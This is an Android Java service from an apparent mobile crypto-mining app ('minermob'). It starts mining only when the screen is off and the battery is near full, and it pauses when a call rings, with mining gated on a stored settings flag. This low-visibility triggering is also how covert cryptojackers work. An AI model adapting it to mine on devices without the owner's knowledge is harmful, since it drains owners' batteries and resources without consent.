package minermob.service.c;

import android.app.AlarmManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.SharedPreferences;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.os.CpuUsageInfo;
import android.os.HardwarePropertiesManager;
import android.os.IBinder;
import android.telecom.TelecomManager;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Properties;

import minermob.service.R;
import minermob.service.utils.b;
import minermob.service.utils.Filtreler;
import minermob.service.utils.spMain;

public class MBS extends Service {

    private static Boolean ekranDurumu = true;
    private static Boolean pilDurumu = false;
    private static Boolean calismaDurumu = false;
    private MS.MSB binder;
    // Local receiver.
    ScreenOnReceiver screenOnReceiver = new ScreenOnReceiver();

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private ServiceConnection serverConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
            try {
                binder = (MS.MSB) iBinder;
            }catch (Exception e){
                Log.d("Minermob", String.valueOf(e));
            }

        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {
            binder = null;
        }
    };


    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        if (intent == null) {
            Filtreler.ekle(this);
            return;
        }
        String action = intent.getAction();

        try {
            TelephonyManager telecomManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);

            PhoneStateListener phoneStateListener = new PhoneStateListener() {
                @Override
                public void onCallStateChanged(int state, String incomingNumber) {
                    super.onCallStateChanged(state, incomingNumber);
                    if (state == TelephonyManager.CALL_STATE_RINGING) {
                        if (calismaDurumu) {
                            ekranDurumu = true;
                            calismaDurumu = false;
                            miningBaslaDurdur(false);
                        }


                    }
                }
            };
            telecomManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE);
        } catch (Exception e) {
            Log.d("Minermob", String.valueOf(e));
        }


        if (spMain.spGetBoolean(getResources().getString(R.string.test), this)) {
            miningBaslaDurdur(true);
        }

        if (spMain.spGetBoolean(getResources().getString(R.string.status), this)) {

            if (b.gbl(intent, this) >= 95) {
                pilDurumu = true;

            } else {
                pilDurumu = false;
            }

            if (Intent.ACTION_SCREEN_ON.equals(action)) {
                ekranDurumu = true;
            }


            if (Intent.ACTION_SCREEN_OFF.equals(action)) {
                ekranDurumu = false;
            }


            if (!ekranDurumu && pilDurumu) {
                if (!calismaDurumu) {
                    miningBaslaDurdur(true);
                    calismaDurumu = true;
                }

            } else {
                if (calismaDurumu) {
                    miningBaslaDurdur(false);
                    calismaDurumu = false;
                }


            }


        }
    }

    private void beklet(int i) {
        try {
            Thread.sleep(i);
        } catch (InterruptedException ex) {
            Thread.currentThread().interrupt();
        }

    }


    private void miningBaslaDurdur(Boolean durum) {

        try {
            if (durum) {
                binder.getService().startMining();
            } else {
                binder.getService().stopMining();
            }

        } catch (Exception e) {
            Intent intent2 = new Intent(this, MS.class);
            bindService(intent2, serverConnection, BIND_AUTO_CREATE);
            startService(intent2);
        }

        beklet(1000);
    }


    class ScreenOnReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            try {
                context.getApplicationContext().unregisterReceiver(screenOnReceiver);

            } catch (Exception e) {
                Log.d("Minermob", String.valueOf(e));
            }
        }
    }


}
